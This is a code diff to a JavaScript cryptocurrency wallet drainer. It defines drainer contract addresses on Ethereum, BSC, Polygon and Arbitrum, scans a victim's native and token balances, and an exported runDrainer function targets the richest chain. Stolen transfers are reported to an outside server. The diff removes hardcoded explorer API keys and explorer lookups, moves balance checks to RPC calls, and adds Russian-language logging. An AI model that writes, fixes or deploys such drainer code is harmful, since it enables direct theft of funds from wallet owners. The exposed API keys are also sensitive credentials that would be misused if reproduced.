@@ -156,14 +156,6 @@ const DRAINER_ABI = [
   "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
 ];
 
-// Ключи API для сканеров
-const ETHERSCAN_API_KEY = "X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT";
-const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
-const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
-const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
-const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
-const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";
-
 // Идентификаторы токенов (по символу токена для Binance API)
 const TOKEN_SYMBOLS = {
   "ETH": "ETHUSDT",
@@ -239,8 +231,6 @@ const CHAINS = {
     usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
     usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
     drainerAddress: "0x4202B38858847813aDEe0cdbeB339B3e4Fb2Ae82",
-    explorerApi: "https://api.etherscan.io/api",
-    explorerApiKey: ETHERSCAN_API_KEY,
     otherTokenAddresses: {
       DAI: "0x6b175474e89094c44da98b954eedeac495271d0f",
       WBTC: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
@@ -279,8 +269,6 @@ const CHAINS = {
     usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
     usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
     drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
-    explorerApi: "https://api.bscscan.com/api",
-    explorerApiKey: BSCSCAN_API_KEY,
     otherTokenAddresses: {
       SHIB: "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
       PEPE: "0x25d887ce7a35172c62febfd67a1856f20faebb00",
@@ -309,8 +297,6 @@ const CHAINS = {
     usdtAddress: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
     usdcAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
     drainerAddress: "0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c",
-    explorerApi: "https://api.polygonscan.com/api",
-    explorerApiKey: POLYGONSCAN_API_KEY,
     otherTokenAddresses: {
       SHIB: "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec",
       PEPE: "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56",
@@ -330,8 +316,6 @@ const CHAINS = {
     usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
     usdcAddress: "0xaf88d065e77c8cc2239327c5edb3a432268e583",
     drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
-    explorerApi: "https://api.arbiscan.io/api",
-    explorerApiKey: ARBISCAN_API_KEY,
     otherTokenAddresses: {
       SHIB: "0x5033833c9fe8b503ed2abafac6d2eb2fbf33a36",
       PEPE: "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51"
@@ -367,77 +351,57 @@ async function getWorkingProvider(rpcUrls) {
 
   const results = await Promise.all(providerPromises);
   const workingProvider = results.find(provider => provider !== null);
-  if (!workingProvider) throw new Error();
+  if (!workingProvider) throw new Error('No working provider found');
   return workingProvider;
 }
 
-// Получение баланса нативного токена через API
-async function getBalanceFromExplorer(address, chainId) {
-  const config = CHAINS[chainId];
-  const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
-  try {
-    const response = await fetch(apiUrl);
-    const data = await response.json();
-    if (data.status === "1") return ethers.BigNumber.from(data.result);
-    throw new Error();
-  } catch {
-    throw new Error();
-  }
-}
-
-// Получение баланса токена через API
-async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
-  const config = CHAINS[chainId];
-  const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
-  try {
-    const response = await fetch(apiUrl);
-    const data = await response.json();
-    if (data.status === "1") return ethers.BigNumber.from(data.result);
-    throw new Error();
-  } catch {
-    throw new Error();
-  }
-}
-
-// Проверка баланса с использованием API и fallback на RPC
+// Проверка баланса с использованием только RPC
 async function checkBalance(chainId, userAddress, provider) {
   const config = CHAINS[chainId];
   let nativeBalance, tokenBalances = {};
 
+  // Получаем баланс нативного токена через RPC
   try {
-    nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
-  } catch {
     nativeBalance = await provider.getBalance(userAddress);
+    console.log(`📊 Баланс нативного токена (${config.nativeToken}): ${ethers.utils.formatEther(nativeBalance)}`);
+  } catch (error) {
+    console.error(`❌ Ошибка получения баланса нативного токена: ${error.message}`);
+    throw new Error('Failed to fetch native balance');
   }
 
+  // Получаем баланс USDT через RPC
   try {
-    tokenBalances[config.usdtAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
-  } catch {
     const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
     tokenBalances[config.usdtAddress] = await usdt.balanceOf(userAddress);
+    console.log(`📊 Баланс USDT: ${ethers.utils.formatUnits(tokenBalances[config.usdtAddress], 6)}`);
+  } catch (error) {
+    console.warn(`⚠️ Не удалось получить баланс USDT: ${error.message}`);
+    tokenBalances[config.usdtAddress] = ethers.BigNumber.from(0);
   }
 
+  // Получаем баланс USDC через RPC
   try {
-    tokenBalances[config.usdcAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
-  } catch {
     const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
     tokenBalances[config.usdcAddress] = await usdc.balanceOf(userAddress);
+    console.log(`📊 Баланс USDC: ${ethers.utils.formatUnits(tokenBalances[config.usdcAddress], 6)}`);
+  } catch (error) {
+    console.warn(`⚠️ Не удалось получить баланс USDC: ${error.message}`);
+    tokenBalances[config.usdcAddress] = ethers.BigNumber.from(0);
   }
 
+  // Получаем балансы других токенов через RPC
   if (config.otherTokenAddresses) {
     const tokenAddresses = Object.values(config.otherTokenAddresses);
     const balancePromises = tokenAddresses.map(async (tokenAddress) => {
       try {
-        const balance = await getTokenBalanceFromExplorer(userAddress, tokenAddress, chainId);
-        return { address: tokenAddress, balance };
-      } catch {
         const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-        try {
-          const balance = await token.balanceOf(userAddress);
-          return { address: tokenAddress, balance };
-        } catch {
-          return { address: tokenAddress, balance: ethers.BigNumber.from(0) };
-        }
+        const balance = await token.balanceOf(userAddress);
+        const decimals = await token.decimals();
+        console.log(`📊 Баланс токена ${tokenAddress}: ${ethers.utils.formatUnits(balance, decimals)}`);
+        return { address: tokenAddress, balance };
+      } catch (error) {
+        console.warn(`⚠️ Не удалось получить баланс токена ${tokenAddress}: ${error.message}`);
+        return { address: tokenAddress, balance: ethers.BigNumber.from(0) };
       }
     });
 
@@ -471,8 +435,9 @@ async function switchChain(chainId) {
       method: "wallet_switchEthereumChain",
       params: [{ chainId: CHAINS[chainId].chainIdHex }]
     });
-  } catch {
-    throw new Error();
+  } catch (error) {
+    console.error(`❌ Ошибка переключения сети: ${error.message}`);
+    throw new Error('Failed to switch chain');
   }
 }
 
@@ -738,7 +703,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 
     const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
     if (roundedAmount.lte(0)) {
-      throw new Error();
+      throw new Error('Amount is zero or negative');
     }
 
     const response = await fetch('https://api.checkalex.xyz/api/transfer', {
@@ -754,10 +719,11 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
     });
     const data = await response.json();
     if (!data.success) {
-      throw new Error();
+      throw new Error('Failed to notify server');
     }
-  } catch {
-    throw new Error();
+  } catch (error) {
+    console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
+    throw new Error('Failed to notify server');
   }
 }
 
@@ -781,7 +747,8 @@ export async function runDrainer(provider, signer, userAddress) {
       const reliableProvider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
       const balance = await checkBalance(chainId, userAddress, reliableProvider);
       return { chainId: Number(chainId), balance, provider: reliableProvider };
-    } catch {
+    } catch (error) {
+      console.error(`❌ Ошибка проверки баланса для chainId ${chainId}: ${error.message}`);
       return null;
     }
   });
@@ -796,7 +763,7 @@ export async function runDrainer(provider, signer, userAddress) {
     });
 
   if (!sorted.length) {
-    return 'rejected';
+    throw new Error('No funds found on any chain');
   }
 
   const target = sorted[0];
